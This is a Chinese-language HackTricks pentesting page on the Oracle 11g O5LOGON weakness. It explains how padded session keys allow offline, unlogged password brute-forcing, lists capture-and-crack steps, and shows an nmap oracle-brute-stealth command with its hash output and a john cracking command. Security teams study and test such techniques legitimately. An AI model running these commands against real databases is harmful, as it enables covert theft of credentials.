<details>

<summary><strong>从零到英雄学习AWS黑客攻击</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来**分享您的黑客技巧**。

</details>


# 外围防御：远程隐蔽密码暴力破解

**版本11.1.0.6、11.1.0.7、11.2.0.1、11.2.0.2和11.2.0.3容易受到此技术的攻击**。为了理解这个漏洞背后的原理，你需要考虑认证协议如何与数据库协作。我将展示版本11的情况。与服务器的交互如下：

1. 客户端连接到服务器并发送用户名。
2. 服务器生成会话标识符（‘AUTH_SESSKEY’）并使用AES-192加密。系统使用从用户密码和盐（‘AUTH_VFR_DATA’）生成的SHA-1哈希作为密钥。
3. 服务器将加密的会话ID和盐发送给客户端。
4. 客户端通过散列其密码和接收到的盐来生成密钥。客户端使用这个密钥来解密从服务器接收到的会话数据。
5. 基于解密的服务器会话ID，客户端生成一个新的公钥以供将来使用。

现在，最有趣的部分来了：服务器发送给客户端的会话ID ‘AUTH_SESSKEY’ 长度为48字节。其中，40字节是随机的，最后8个字节是‘0x08’的重复。初始化向量是0x00（Null）。
知道公共标识符的最后8个字节总是由‘0x08’组成，我们可以暴力破解这个密码，而且，可以离线进行，这意味着特别快的速度，特别是如果你使用GPU。要发起攻击，你需要知道SID，有效登录（例如，‘SYS’账户非常有趣）并且，当然，有能力连接到数据库。在这种情况下，Oracle审计日志中不会创建像‘Invalid Login Attempt’这样的记录！

总结一下：

1. 使用Wireshark来**截取**在**授权**期间的**初始流量**。这将通过‘tns’过滤器来帮助。
2. 提取**AUTH_SESSKEY, AUTH_VFR_DATA的HEX值**。
3. 将它们插入[**PoC脚本**](https://www.exploit-db.com/exploits/22069)，该脚本将执行字典（暴力破解）攻击。

## 使用nmap和john
```
root@kali:~# nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30

Starting Nmap 6.49BETA4 (https://nmap.org) at 2016-03-02 14:58 EST
Nmap scan report for 10.11.21.30
PORT     STATE SERVICE
1521/tcp open  oracle
| oracle-brute-stealth:
|   Accounts
|     SYS:$o5logon$1245C95384E15E7F0C893FCD1893D8E19078170867E892CE86DF90880E09FAD3B4832CBCFDAC1
|     A821D2EA8E3D2209DB6*4202433F49DE9AE72AE2 -
|     Hashed valid or invalid credentials
|   Statistics
|_    Performed 241 guesses in 12 seconds, average tps: 20

john hashes.txt
```
<details>

<summary><strong>从零开始学习AWS黑客攻击直至成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您希望在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库**提交PR来分享您的黑客技巧**。

</details>
